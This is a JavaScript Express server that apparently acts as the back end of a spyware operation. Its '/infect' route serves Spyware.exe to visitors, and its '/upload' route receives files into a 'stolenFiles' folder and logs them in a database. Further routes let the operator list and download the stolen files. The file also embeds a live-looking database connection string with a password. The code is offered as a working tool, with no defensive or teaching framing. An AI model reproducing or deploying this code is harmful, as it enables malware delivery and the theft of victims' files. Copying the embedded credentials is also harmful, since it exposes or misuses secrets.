import cors from 'cors';
import express, { query } from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import multer from 'multer';
import { PgHandler } from '../utils/pgManager.js';
import { config } from 'process';


const spywareDB = new PgHandler({
    config: {
        "connectionString": "postgresql://SpywareDB_owner:npg_Z4i5OHNpzVJE@ep-quiet-wave-a5ev25su-pooler.us-east-2.aws.neon.tech/SpywareDB?sslmode=require",
        "ssl": {
            "rejectUnauthorized": false
        }
    },
    querys: {
        "getFiles": "SELECT * FROM file",
        "insertFile": "INSERT INTO file (file_name) VALUES ($1)",
        "getFile": "SELECT file_name FROM file WHERE id_file = $1"
    }
});

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json());
app.use(cors());
const PORT = 3000;

// Configuración de multer
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, 'stolenFiles/');
    },
    filename: (req, file, cb) => {
        cb(null, `${Date.now()}-${file.originalname}`);
    }
});
const upload = multer({ storage });

app.get('/infect', (req, res) => {
    try {
        const spywareExePath = path.join(__dirname, '../Spyware.exe');
        console.log('Infecting client...');
        console.log(spywareExePath);
        res.download(spywareExePath, 'Spyware.exe');
    } catch (error) {
        console.error('Error infecting:', error);
        res.status(500).json({ error: 'Error infecting' });
        
    }

});

app.post('/upload', upload.single('file'), async (req, res) => {
    try {
        const { file } = req;
        console.log(file);
        const queryResult = await spywareDB.exeQuery({ key: 'insertFile', params: [file.filename] });
        console.log(queryResult);
        res.json({ success: true });
    } catch (error) {
        console.error('Error uploading file:', error);
        res.status(500).json({ error: 'Error uploading file' });
    }
});

app.get('/getFiles', async (req, res)=>{
    try {

        const queryResult = await spywareDB.exeQuery({key: 'getFiles'})
        console.log(queryResult)
        res.status(200).json({success: true, data: queryResult})
    } catch (error) {
        res.status(500).json({error: 'Error getting files'})
    }
})

app.get('/getFile/:id', async (req, res) => {
    try {
        const {id} = req.params;
        console.log(id);
        const [{file_name: data}] = await spywareDB.exeQuery({ key: 'getFile', params: [id] })
        console.log(data);
        const filePath = path.join(__dirname, '../stolenFiles', data);
        console.log(filePath);
        res.download(filePath, data);
        //const file
        //res.status(200).json({ success: true, data });
    } catch (error) {
        console.error('Error getting file:', error);
        res.status(500).json({ error: 'Error getting file' });    
        }
})

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});